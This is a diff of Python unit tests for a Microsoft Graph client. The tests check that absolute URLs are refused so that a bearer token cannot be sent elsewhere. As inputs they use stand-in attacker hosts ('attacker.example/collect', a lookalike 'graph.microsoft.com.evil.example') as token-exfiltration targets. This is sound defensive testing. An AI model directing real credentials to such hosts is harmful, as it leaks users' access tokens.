@@ -82,6 +82,29 @@ class GraphContractTests(unittest.TestCase):
     def test_retry_after_is_capped_to_protect_turn_deadline(self):
         self.assertEqual(self.m._retry_delay({"Retry-After": "600"}, 0), 20)
 
+    def test_absolute_graph_escape_hatch_cannot_exfiltrate_bearer_token(self):
+        with mock.patch.object(self.m, "_token", return_value="sensitive-token"), \
+             mock.patch.object(self.m.urllib.request, "urlopen") as urlopen:
+            result = self.m.graph_query("https://attacker.example/collect")
+
+        self.assertIn("unsafe Graph path refused", result)
+        self.assertIn("Nothing was sent", result)
+        urlopen.assert_not_called()
+
+    def test_absolute_graph_url_accepts_only_https_v1_endpoint(self):
+        accepted = self.m._graph_url(
+            "https://graph.microsoft.com/v1.0/me?$select=id")
+        self.assertEqual(
+            "https://graph.microsoft.com/v1.0/me?$select=id", accepted)
+        for value in (
+            "http://graph.microsoft.com/v1.0/me",
+            "https://graph.microsoft.com.evil.example/v1.0/me",
+            "https://graph.microsoft.com/beta/me",
+            "//attacker.example/collect",
+        ):
+            with self.subTest(value=value), self.assertRaises(ValueError):
+                self.m._graph_url(value)
+
     def test_get_retries_connection_timeout_with_bounded_backoff(self):
         with mock.patch.object(self.m, "_token", return_value="token"), \
              mock.patch.object(self.m.urllib.request, "urlopen", side_effect=[
